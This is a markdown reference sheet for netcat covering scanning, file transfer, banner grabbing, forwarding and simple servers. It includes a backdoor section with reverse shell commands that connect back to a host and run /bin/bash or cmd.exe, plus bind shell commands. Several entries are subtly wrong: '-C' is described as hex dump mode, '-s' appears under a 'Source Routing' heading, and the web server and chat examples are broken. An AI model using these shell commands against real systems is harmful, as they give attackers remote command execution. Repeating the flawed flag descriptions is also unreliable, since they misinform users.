# Netcat - Network Swiss Army Knife

## Overview
Netcat (nc) is a versatile networking utility for:
- Port scanning
- File transfers
- Port forwarding
- Network debugging
- Backdoor creation
- Banner grabbing

## Basic Usage

### Simple Connections
```bash
# Connect to TCP port
nc target.com 80

# Connect to UDP port
nc -u target.com 53

# Connect with timeout
nc -w 10 target.com 80

# Connect with verbose output
nc -v target.com 80
```

### Listener Mode
```bash
# Listen on TCP port
nc -l -p 8080

# Listen on UDP port
nc -l -u -p 8080

# Listen continuously (keep alive after disconnect)
nc -l -k -p 8080

# Listen with verbose output
nc -l -v -p 8080
```

## Port Scanning

### Basic Scanning
```bash
# Scan single port
nc -z target.com 80

# Scan multiple ports
nc -z target.com 80 443 8080

# Scan port range
nc -z target.com 1-1000

# Scan with verbose output
nc -v -z target.com 1-1000
```

### Advanced Scanning
```bash
# Fast scan (no delay)
nc -z -w 1 target.com 1-65535

# Scan with source port
nc -p 40000 -z target.com 80

# UDP port scan
nc -u -z target.com 53

# Scan multiple hosts
nc -z target1.com target2.com target3.com 80
```

## File Transfer

### Send Files
```bash
# Send file to listener
nc target.com 8080 < file.txt

# Send file with progress
pv file.txt | nc target.com 8080

# Send directory (tar)
tar -czf - directory/ | nc target.com 8080

# Send with compression
gzip -c file.txt | nc target.com 8080
```

### Receive Files
```bash
# Receive file
nc -l -p 8080 > received_file.txt

# Receive directory
nc -l -p 8080 | tar -xzf -

# Receive compressed file
nc -l -p 8080 | gunzip > file.txt

# Receive with timeout
nc -l -w 30 -p 8080 > file.txt
```

## Banner Grabbing

### Service Banners
```bash
# Grab HTTP banner
echo "GET / HTTP/1.0\r\n\r\n" | nc target.com 80

# Grab FTP banner
nc -v -w 1 target.com 21

# Grab SSH banner
echo "" | nc -v -w 1 target.com 22

# Grab SMTP banner
nc -v -w 1 target.com 25
```

### Custom Banners
```bash
# Send custom request
printf "GET / HTTP/1.1\r\nHost: %s\r\n\r\n" target.com | nc target.com 80

# Send HTTP HEAD request
echo "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80
```

## Port Forwarding & Proxying

### Simple Port Forwarding
```bash
# Forward local port to remote port
nc -l -p 8080 | nc target.com 80

# Bidirectional forwarding
mkfifo /tmp/pipe
nc -l -p 8080 < /tmp/pipe | nc target.com 80 > /tmp/pipe
```

### Proxy Server
```bash
# Simple HTTP proxy
while true; do nc -l -p 8080 -c "nc google.com 80"; done

# Proxy with logging
nc -l -p 8080 | tee proxy.log | nc target.com 80
```

## Web Server

### Simple HTTP Server
```bash
# Basic HTTP server
while true; do nc -l -p 8080 -e echo -e "HTTP/1.1 200 OK\r\n\r\nHello World"; done

# Serve files
while true; do nc -l -p 8080 -c "cat index.html"; done

# Serve directory listing
nc -l -p 8080 -c "ls -la"
```

## Backdoor & Remote Access

### Reverse Shell
```bash
# Connect back to listener
nc target.com 8080 -e /bin/bash

# Connect with TLS encryption
nc target.com 8080 -e /bin/bash --ssl

# Reverse shell from Windows
nc target.com 8080 -e cmd.exe
```

### Bind Shell
```bash
# Bind shell to port
nc -l -p 8080 -e /bin/bash

# Bind shell with password protection
nc -l -p 8080 -c "read pass; if [ \$pass = 'secret' ]; then /bin/bash; fi"
```

## Network Testing

### Connectivity Testing
```bash
# Test port connectivity
nc -zv target.com 80

# Test UDP connectivity
nc -u -zv target.com 53

# Test with timeout
nc -w 5 -zv target.com 80

# Test IPv6 connectivity
nc -6 target.com 80
```

### Bandwidth Testing
```bash
# Test bandwidth to server
dd if=/dev/zero bs=1M count=100 | nc target.com 8080

# Receive and measure speed
nc -l -p 8080 | dd of=/dev/null

# Test UDP bandwidth
nc -u target.com 8080 < /dev/urandom
```

## Data Transfer with Encryption

### SSL/TLS
```bash
# SSL encrypted connection
nc --ssl target.com 443

# SSL listener
nc --ssl -l -p 8443

# Self-signed certificate
nc --ssl-cert cert.pem --ssl-key key.pem -l -p 8443
```

### Custom Encryption
```bash
# Send encrypted file
openssl enc -aes-256-cbc -salt -in file.txt | nc target.com 8080

# Receive encrypted file
nc -l -p 8080 | openssl enc -aes-256-cbc -d -out file.txt
```

## Practical Examples

### Port Scanner
```bash
# Script for port scanning
#!/bin/bash
target=$1
ports=$(seq 1 65535)
for port in $ports; do
    timeout 1 nc -z $target $port && echo "Port $port open"
done
```

### File Transfer Service
```bash
# Simple file transfer server
while true; do
    nc -l -p 8080 > "received_$(date +%Y%m%d_%H%M%S).bin"
done
```

### Chat Server
```bash
# Simple chat server
nc -l -p 8080 | tee chat.log | nc target.com 8080
```

### System Monitoring
```bash
# Send system status
top -b -n 1 | nc target.com 8080

# Continuous monitoring
while true; do
    uptime | nc target.com 8080
    sleep 60
done
```

## Advanced Features

### Hex Dump Mode
```bash
# Hex dump mode
nc -l -p 8080 -C

# Send hex data
echo -e "\x48\x65\x6C\x6C\x6F" | nc target.com 8080
```

### Source Routing
```bash
# Set source IP address
nc -s 192.168.1.100 target.com 80

# Set source port
nc -p 40000 target.com 80
```

## Tips
- Use `-v` for verbose output to see connection details
- Use `-z` for zero-I/O mode (scanning only)
- Use `-w` to set timeouts and avoid hanging
- Combine with other tools for complex workflows
- Be aware of security implications of backdoor usage
- Use encrypted connections for sensitive data
- Test connections before data transfer
- Monitor network traffic for security analysis